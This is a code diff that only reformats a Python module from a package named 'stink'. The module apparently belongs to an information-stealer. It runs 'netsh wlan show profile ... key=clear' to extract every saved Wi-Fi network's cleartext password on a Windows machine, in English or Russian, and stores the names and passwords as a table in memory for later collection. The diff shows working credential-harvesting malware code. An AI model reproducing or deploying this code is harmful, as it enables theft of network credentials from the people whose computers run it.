@@ -5,39 +5,54 @@ import chardet
 
 from stink.helpers import functions, MemoryStorage
 
+
 class Wifi:
     def __init__(self, folder: str):
         self.__file = path.join(folder, "Wifi.txt")
         self.__storage = MemoryStorage()
-    
+
     @staticmethod
     def decode_text(text):
-        return text.decode(encoding=chardet.detect(text)['encoding'], errors="ignore")
+        return text.decode(encoding=chardet.detect(text)["encoding"], errors="ignore")
 
     @staticmethod
     def get_wifi_profiles() -> List[str]:
         def decode_text(text):
-            return text.decode(encoding=chardet.detect(text)['encoding'], errors="ignore")
+            return text.decode(
+                encoding=chardet.detect(text)["encoding"], errors="ignore"
+            )
 
         def _any(cmd_result):
-            KEY_CONTENT = ["All User Profile", 'Все профили пользователей']
+            KEY_CONTENT = ["All User Profile", "Все профили пользователей"]
             return any(keyword in cmd_result for keyword in KEY_CONTENT)
 
-        cmd_results = decode_text(subprocess.check_output('netsh wlan show profiles')).split("\r\n")
-        profiles = [cmd_result.split(": ")[-1] for cmd_result in cmd_results if _any(cmd_result)]
+        cmd_results = decode_text(
+            subprocess.check_output("netsh wlan show profiles")
+        ).split("\r\n")
+        profiles = [
+            cmd_result.split(": ")[-1] for cmd_result in cmd_results if _any(cmd_result)
+        ]
         return profiles
 
     @staticmethod
     def extract_wifi_password(profile: str) -> str:
         def decode_text(text):
-            return text.decode(encoding=chardet.detect(text)['encoding'], errors="ignore")
+            return text.decode(
+                encoding=chardet.detect(text)["encoding"], errors="ignore"
+            )
 
         def _any(cmd_result):
             KEY_CONTENT = ["Key Content", "Ключ безопасности"]
             return any(keyword in cmd_result for keyword in KEY_CONTENT)
 
-        cmd_results = decode_text(subprocess.check_output(f"netsh wlan show profile \"{profile}\" key=clear")).split("\r\n")
-        password = [cmd_result.split(":")[1][1:] for cmd_result in cmd_results if _any(cmd_result)]
+        cmd_results = decode_text(
+            subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear')
+        ).split("\r\n")
+        password = [
+            cmd_result.split(":")[1][1:]
+            for cmd_result in cmd_results
+            if _any(cmd_result)
+        ]
         if len(password) == 1:
             return password[0]
 
@@ -51,7 +66,9 @@ class Wifi:
 
         self.__storage.add_from_memory(
             self.__file,
-            "\n".join(line for line in functions.create_table(["Wifi", "Password"], wifi_data))
+            "\n".join(
+                line for line in functions.create_table(["Wifi", "Password"], wifi_data)
+            ),
         )
 
     def run(self) -> List:
